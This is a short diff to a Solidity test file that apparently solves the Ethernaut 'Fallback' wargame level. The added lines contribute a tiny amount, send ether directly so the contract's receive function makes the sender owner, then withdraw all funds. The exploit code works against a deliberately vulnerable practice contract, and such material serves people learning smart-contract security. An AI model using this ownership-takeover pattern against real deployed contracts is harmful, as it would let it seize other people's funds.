@@ -29,6 +29,16 @@ contract FallbackTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // Due to the receive function, it is possible to become owner
+        // and take possession of the funds by:
+        // 1. contribute
+        ethernautFallback.contribute{value: 0.0001 ether}();
+        // 2. send ether to the contract
+        (bool success,) = address(ethernautFallback).call{value: 0.001 ether}("");
+        if (!success) revert("Low level call failed");
+        // 3. withdraw
+        ethernautFallback.withdraw();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
